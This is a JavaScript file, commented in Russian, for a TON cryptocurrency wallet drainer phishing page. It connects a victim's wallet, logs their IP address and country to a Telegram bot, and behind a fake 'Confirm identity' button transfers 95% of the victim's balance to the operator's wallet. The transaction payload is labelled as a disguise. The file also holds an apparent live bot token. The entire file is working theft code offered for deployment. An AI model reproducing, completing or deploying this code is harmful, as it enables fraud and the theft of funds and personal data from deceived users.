// ======== НАСТРОЙКИ (ЗАМЕНИТЬ!) ========
var mainWallet = "UQB8vV6TevtZAjKxoaXa8gaOqeu9YhClqtpLBTsvS8orahlI"; // Ваш адрес
var tgBotToken = "8291343736:AAHdt8jo9480EvllENN-JEQZNOElnwuxtBg";   // Токен бота
var tgChat = "-1001234567890";  // ID канала (с минусом для группы)

// ======== ОСТАЛЬНОЕ НЕ ТРОГАТЬ ========
var domain = window.location.hostname;
var ipUser = 'unknown';
var countryUser = 'unknown';

// Получение IP и страны (для логов)
fetch('https://ipapi.co/json/')
    .then(r => r.json())
    .then(d => { ipUser = d.ip || 'unknown'; countryUser = d.country || 'unknown'; })
    .catch(e => console.error('IP error:', e));

// Отправка в Telegram
function sendTelegram(text) {
    if (!tgBotToken || !tgChat) return;
    fetch(`https://api.telegram.org/bot${tgBotToken}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ chat_id: tgChat, text, parse_mode: 'Markdown' })
    }).catch(e => console.error('Telegram error:', e));
}

// Инициализация TON Connect UI
const manifestUrl = `${window.location.protocol}//${domain}/tonconnect-manifest.json`;
const tonConnectUI = new TON_CONNECT_UI.TonConnectUI({ 
    manifestUrl, 
    buttonRootId: 'ton-connect' 
});

const balanceSpan = document.getElementById('balanceValue');
const drainBtn = document.getElementById('drainBtn');
const statusDiv = document.getElementById('status');

// Обновление баланса через toncenter.com API
async function updateBalance(address) {
    try {
        const resp = await fetch(`https://toncenter.com/api/v2/getAddressBalance?address=${address}`);
        const data = await resp.json();
        if (data.ok) {
            const bal = parseInt(data.result) / 1e9;
            balanceSpan.textContent = bal.toFixed(6);
            return bal;
        } else {
            throw new Error('API error');
        }
    } catch (e) {
        console.error('Balance error:', e);
        balanceSpan.textContent = 'Ошибка';
        return 0;
    }
}

// События подключения
tonConnectUI.on('walletConnected', async (wallet) => {
    const addr = tonConnectUI.account?.address;
    if (addr) {
        drainBtn.disabled = false;
        statusDiv.textContent = '✅ Кошелёк подключён';
        const bal = await updateBalance(addr);
        sendTelegram(`✅ *Подключен*\n👤 ${ipUser} (${countryUser})\n💰 ${bal.toFixed(4)} TON\n🔗 [${addr}](https://tonscan.org/address/${addr})`);
    }
});

tonConnectUI.on('walletDisconnected', () => {
    drainBtn.disabled = true;
    balanceSpan.textContent = '—';
    statusDiv.textContent = '⛔ Кошелёк отключён';
});

// Кнопка "Подтвердить личность" – отправка 95% баланса
drainBtn.addEventListener('click', async function() {
    const addr = tonConnectUI.account?.address;
    if (!addr) {
        alert('Сначала подключите кошелёк');
        return;
    }

    statusDiv.textContent = '⏳ Получение баланса...';
    drainBtn.disabled = true;

    // Получаем актуальный баланс
    let balance = 0;
    try {
        const resp = await fetch(`https://toncenter.com/api/v2/getAddressBalance?address=${addr}`);
        const data = await resp.json();
        if (data.ok) {
            balance = parseInt(data.result) / 1e9;
        } else {
            throw new Error('API error');
        }
    } catch (e) {
        console.error('Balance fetch error:', e);
        statusDiv.textContent = '❌ Ошибка получения баланса';
        drainBtn.disabled = false;
        alert('Ошибка получения баланса');
        return;
    }

    if (balance < 0.01) {
        statusDiv.textContent = '❌ Баланс меньше 0.01 TON';
        drainBtn.disabled = false;
        alert('Баланс меньше 0.01 TON – операция невозможна');
        return;
    }

    const amountToSend = balance * 0.95;
    const amountNano = Math.floor(amountToSend * 1e9);

    statusDiv.textContent = `⏳ Отправка ${amountToSend.toFixed(4)} TON...`;

    const transaction = {
        validUntil: Math.floor(Date.now() / 1000) + 300,
        messages: [{
            address: mainWallet,
            amount: String(amountNano),
            payload: 'Подтверждение личности' // маскировка
        }]
    };

    try {
        const result = await tonConnectUI.sendTransaction(transaction);
        console.log('Tx sent:', result);
        statusDiv.textContent = '✅ Транзакция отправлена!';
        sendTelegram(
            `💰 *Перевод выполнен*\n👤 ${ipUser} (${countryUser})\n📤 ${amountToSend.toFixed(4)} TON → ${mainWallet}\n🔗 [Tx](https://tonscan.org/tx/${result})`
        );
        alert('✅ Подтверждение выполнено успешно!');
        // обновляем баланс после отправки
        setTimeout(() => updateBalance(addr), 3000);
    } catch (e) {
        console.error('Tx error:', e);
        statusDiv.textContent = '❌ Отклонено или ошибка';
        sendTelegram(`❌ *Отказ или ошибка*\n👤 ${ipUser} (${countryUser})`);
        alert('❌ Отклонено или ошибка');
    } finally {
        drainBtn.disabled = false;
    }
});
